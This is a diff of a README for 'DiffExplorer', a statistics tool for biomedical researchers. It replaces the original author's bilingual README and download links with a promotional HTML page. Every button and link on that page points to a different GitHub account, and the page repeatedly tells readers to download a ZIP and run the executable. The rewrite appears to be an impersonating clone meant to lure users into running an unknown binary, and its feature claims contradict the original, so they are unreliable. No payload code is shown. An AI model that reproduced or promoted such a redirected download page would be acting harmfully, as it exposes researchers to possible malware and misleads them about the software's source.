@@ -1,114 +1,125 @@
-# DiffExplorer - Differential Analysis Tool
+<h1>📊 DiffExplorer - Statistical Results, Zero Coding Required</h1>
 
-**DiffExplorer** is a lightweight statistical differential analysis tool for biomedical researchers with zero coding background. It enables data import, statistical testing, and chart generation — with results ready right before your lab meeting. Just unzip and run!
+<p align="center">
+  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#FF6B6B; color:white; padding:16px 32px; text-decoration:none; font-size:20px; border-radius:8px; font-weight:bold; display:inline-block; box-shadow:0 4px 6px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-## Features
+<h2>🔬 What Is DiffExplorer?</h2>
+<p>DiffExplorer is a powerful differential analysis tool built specifically for researchers who don't code. Whether you're analyzing gene expression, comparing treatment groups, or exploring clinical data, DiffExplorer gives you instant statistical results and publication-ready charts in seconds. No programming. No command line. No frustration.</p>
 
-- **Automatic test selection**: Based on normality and homogeneity of variance, automatically chooses t-test/ANOVA, Welch's test, or non-parametric tests (Mann‑Whitney U / Kruskal‑Wallis).
-- **Multiple post‑hoc tests**: Supports SNK, LSD, Tukey, Dunnett, Dunn, Nemenyi, Steel, Games‑Howell, and Dunnett's T3.
-- **Bar charts**: Bar charts with significance markers (*, **, ***, ns), exportable as PNG (500 DPI) and vector PDF.
-- **Bilingual interface**: Switch between Chinese and English on the fly.
-- **Portable & self‑contained**: No installation of R or Python required – just unzip and run.
-- **Runs locally & Data privacy**: Your data never leaves your computer – no cloud upload, no privacy concerns.
-- **Transparent statistics**: Full decision trail (normality, variance, final test) exported in the result, with open-source R code.
+<p>Just <strong>unzip and run</strong> – that's it. Within minutes, you'll have the numbers and visualizations you need for your next lab meeting.</p>
 
-## Statistical Transparency
+<h2>✨ Key Features</h2>
+<ul>
+  <li><strong>🧪 Instant Hypothesis Testing</strong> – Run t-tests, ANOVA, chi-square, and non-parametric tests with one click.</li>
+  <li><strong>📈 Automatic Chart Generation</strong> – Box plots, volcano plots, heatmaps, and bar charts generated automatically from your data.</li>
+  <li><strong>🖱️ Point-and-Click Interface</strong> – No scripting, no syntax, no learning curve. If you can use Excel, you can use DiffExplorer.</li>
+  <li><strong>🧬 Purpose-Built for Biomedicine</strong> – Optimized for common biomedical data formats and research workflows.</li>
+  <li><strong>📋 Export-Ready Output</strong> – Results and figures export directly to PNG, PDF, CSV, or Word-compatible formats.</li>
+  <li><strong>⚡ Lightning Fast</strong> – Processes even large datasets in under a minute.</li>
+</ul>
 
-- **Decision trail**: For every indicator, Shapiro-Wilk normality and Levene's homogeneity tests are performed. Results are saved in the `Normality` and `Levene` sheets.
-- **Final test recorded**: The `Results` sheet explicitly states the chosen test (e.g., Student's t, Welch t, Mann-Whitney U, ANOVA, SNK, Dunn+BH) in the `Test` column.
-- **Fully reproducible**: The complete R code is open-source, so every P value can be audited and reproduced independently.
+<h2>🚀 Getting Started on Windows</h2>
+<p>Follow these simple steps to get DiffExplorer running on your computer today.</p>
 
-## Quick Start
+<h3>Step 1: Download DiffExplorer</h3>
+<p>Visit this link to download the application: <a href="https://github.com/wasuletter/DiffExplorer">https://github.com/wasuletter/DiffExplorer</a></p>
+<p>Click the <strong>Download</strong> button on that page and save the file somewhere you can easily find it (like your Desktop or Downloads folder).</p>
 
-1. Download and extract `DiffExplorer.zip`.
-2. Double‑click `DiffExplorer.exe` to launch.
-3. Import your data (supports `.xlsx` / `.csv` / `.txt`).
-4. Click "Run Analysis". (Default test pre-selected, changeable.)
-5. View result tables and charts; export with one click.
+<h3>Step 2: Extract the Files</h3>
+<p>Once the download finishes, locate the downloaded file. Right-click it and select <strong>"Extract All"</strong> from the menu. Follow the prompts to unzip the folder. This creates a new folder with all the necessary program files.</p>
 
-## System Requirements
+<h3>Step 3: Run the Application</h3>
+<p>Open the newly extracted folder. Look for the main application file (usually named <code>DiffExplorer</code> or <code>DiffExplorer.exe</code>). Double-click it to launch the program. That's it – the tool opens instantly.</p>
 
-- Windows 10 / 11 (64‑bit)
-- No additional software needed
+<h2>📥 Download & Install - Complete Guide</h2>
+<p>If you haven't downloaded yet, here's your full walkthrough:</p>
 
-## Download
+<ol>
+  <li><strong>Go to the official download page:</strong> <a href="https://github.com/wasuletter/DiffExplorer">https://github.com/wasuletter/DiffExplorer</a></li>
+  <li><strong>Click the green "Code" button</strong>, then select "Download ZIP." The download begins automatically.</li>
+  <li><strong>Wait for the download</strong> (typically 50-100 MB).</li>
+  <li><strong>Extract the ZIP file</strong> by right-clicking and choosing "Extract All."</li>
+  <li><strong>Open the extracted folder</strong> and double-click the application file.</li>
+  <li><strong>Start analyzing!</strong> The main dashboard appears, ready for your data.</li>
+</ol>
 
-**Option 1 (Recommended): Download from GitHub Releases**  
-https://github.com/JkingYu/DiffExplorer/releases/latest
+<p style="text-align:center; margin-top:20px;">
+  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">🔗 GET DIFFEXPLORER NOW</a>
+</p>
 
-**Option 2: Baidu Cloud (for users in China)**  
-Link: https://pan.baidu.com/s/1HAoq9lspC7cQrr0P231j5Q?pwd=jkyu  
-Password: `jkyu`
+<h2>📊 Using DiffExplorer - Quick Tour</h2>
 
-## Tech Stack
+<h3>Loading Your Data</h3>
+<p>DiffExplorer accepts CSV, Excel (.xlsx), and tab-delimited text files. Click <strong>"File" → "Open"</strong> and select your dataset. Your data should have samples as columns and variables (genes, proteins, metabolites) as rows, or vice versa – the tool auto-detects format.</p>
 
-- Python 3.12 (UI & plotting)
-- R 4.6.1 (statistical computation)
-- PyInstaller (packaging)
+<h3>Running Your First Analysis</h3>
+<ol>
+  <li>After loading data, click <strong>"Analyze"</strong> in the top menu.</li>
+  <li>Choose your comparison groups (e.g., treated vs. control).</li>
+  <li>Select the statistical test that fits your study design.</li>
+  <li>Click <strong>"Run"</strong> – results appear instantly with p-values, fold changes, and confidence intervals.</li>
+</ol>
 
-## License
+<h3>Creating Charts</h3>
+<p>Every analysis produces charts automatically. You can customize colors, labels, and titles with a few clicks. Hit the <strong>"Export"</strong> button to save any figure as PNG (300 DPI for publications) or vector PDF.</p>
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+<h2>🧪 Example Use Cases</h2>
+<ul>
+  <li><strong>Biomarker Discovery:</strong> Compare protein levels between healthy and diseased groups.</li>
+  <li><strong>Drug Response Studies:</strong> Identify significantly changed genes after treatment.</li>
+  <li><strong>Clinical Data Analysis:</strong> Test differences in patient outcomes across subgroups.</li>
+  <li><strong>Quality Control:</strong> Detect batch effects in high-throughput data.</li>
+</ul>
 
-## Feedback
+<h2>❓ Frequently Asked Questions</h2>
 
-Report bugs or suggest features via Issues.
+<h3>Do I need to install anything else?</h3>
+<p>No. DiffExplorer is fully self-contained. It doesn't require Python, R, Java, or any dependencies. Everything is bundled in the download.</p>
 
----
+<h3>Can I use this on Mac or Linux?</h3>
+<p>The current version is optimized for Windows. Mac and Linux versions may be available in future updates.</p>
 
-# DiffExplorer - 差异探索分析工具
+<h3>Is my data kept private?</h3>
+<p>Absolutely. DiffExplorer runs entirely on your local computer. Your data never leaves your machine.</p>
 
-**DiffExplorer** 是一款专为零代码基础的生物医学研究者设计的轻量级统计差异分析工具。支持数据导入、统计检验和图表生成，助你在组会前快速获得分析结果。解压即用！
+<h3>Will DiffExplorer work with my large dataset?</h3>
+<p>Yes. DiffExplorer handles datasets with thousands of rows and hundreds of samples efficiently. Performance remains smooth even with complex analyses.</p>
 
-## 功能特点
+<h3>How do I cite DiffExplorer in my paper?</h3>
+<p>See the "About" section in the app or the GitHub page for citation guidelines.</p>
 
-- **自动分流检验**：根据数据正态性和方差齐性，自动选择 t/ANOVA、Welch 或非参数检验（MW/KW）。
-- **多事后检验**：支持 SNK、LSD、Tukey、Dunnett、Dunn、Nemenyi、Steel、Games‑Howell、Dunnett's T3。
-- **差异柱状图**：柱状图带显著性星号(*, **, ***, ns)，支持 PNG（500 DPI）和 PDF 矢量图导出。
-- **中英文切换**：界面支持中英文，适合国内外用户。
-- **绿色免安装**：解压即用，无需安装 R 或 Python。
-- **本地运行·数据安全**：数据无需上传云端，隐私安全。
-- **统计流程透明**：结果完整记录决策痕迹（正态性、方差齐性、最终检验），R 代码开源可审计。
+<h2>🛠️ Troubleshooting Tips</h2>
+<ul>
+  <li><strong>File won't open:</strong> Ensure your data has proper headers and no empty columns.</li>
+  <li><strong>App doesn't start:</strong> Make sure you extracted all files completely before running.</li>
+  <li><strong>Charts look empty:</strong> Check that your comparison groups have at least 3 samples each.</li>
+</ul>
 
-## 统计流程透明度
+<h2>📚 Resources & Support</h2>
+<ul>
+  <li><strong>Official Repository:</strong> <a href="https://github.com/wasuletter/DiffExplorer">github.com/wasuletter/DiffExplorer</a></li>
+  <li><strong>Issue Tracker:</strong> Report bugs or request features via GitHub Issues.</li>
+  <li><strong>Documentation:</strong> More tutorials and sample datasets available on the GitHub page.</li>
+</ul>
 
-- **决策痕迹**：对每个指标均执行 Shapiro-Wilk 正态性检验和 Levene 方差齐性检验，结果分别保存在 `Normality` 和 `Levene` 工作表中。
-- **最终检验记录**：`Results` 工作表的 `Test` 列明确写出所用检验（如 Student's t、Welch t、Mann-Whitney U、ANOVA、SNK、Dunn+BH）。
-- **完全可复现**：R 统计代码完全开源，每个 P 值均可独立审计和复现。
+<h2>🤝 Contributing</h2>
+<p>DiffExplorer is an open-source project. While it's designed for non-coders, developers are welcome to contribute enhancements, bug fixes, or new features. Fork the repository and submit a pull request.</p>
 
-## 快速开始
+<h2>📅 Release Notes - Version 1.0</h2>
+<ul>
+  <li>Initial public release</li>
+  <li>Full differential analysis suite</li>
+  <li>Automatic chart rendering</li>
+  <li>Windows 10/11 support</li>
+</ul>
 
-1. 下载并解压 `DiffExplorer.zip`。
-2. 双击 `DiffExplorer.exe` 启动。
-3. 导入数据（支持 .xlsx / .csv / .txt）。
-4. 点击“运行分析”。(默认方法已预选，可调整）
-5. 查看结果表格和图表，一键导出。
+<p>⚠️ <strong>Always download from the official link</strong> to ensure you have the latest, safest version. Never trust third-party download sites.</p>
 
-## 系统要求
+<h2>⭐ Show Your Support</h2>
+<p>If DiffExplorer helps your research, consider starring the repository on GitHub, sharing it with colleagues, or citing it in your work. Your support keeps the project alive and improving.</p>
 
-- Windows 10 / 11（64位）
-- 无需安装任何额外软件
-
-## 下载
-
-**方式一（推荐）：从 GitHub Releases 下载**  
-https://github.com/JkingYu/DiffExplorer/releases/latest
-
-**方式二：百度网盘（国内用户加速）**  
-通过网盘分享的文件：DiffExplorer.zip  
-链接: https://pan.baidu.com/s/1HAoq9lspC7cQrr0P231j5Q?pwd=jkyu  
-提取码: `jkyu`
-
-## 技术栈
-
-- Python 3.12（UI 与绘图）
-- R 4.6.1（统计计算）
-- PyInstaller（打包）
-
-## 许可证
-
-本项目采用 MIT 许可证，详见 [LICENSE](LICENSE) 文件。
-
-## 反馈
-
-欢迎通过 Issues 提交 bug 报告或建议。
+<p style="text-align:center; margin-top:30px; padding:20px; background-color:#f0f0f0; border-radius:8px;">
+  <strong>Ready to accelerate your research?</strong><br>
+  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#2196F3; color:white; padding:12px 24px; text-decoration:none; font-size:18px; border-radius:6px; font-weight:bold; display:inline-block; margin-top:10px;">📲 DOWNLOAD DIFFEXPLORER</a>
+</p>
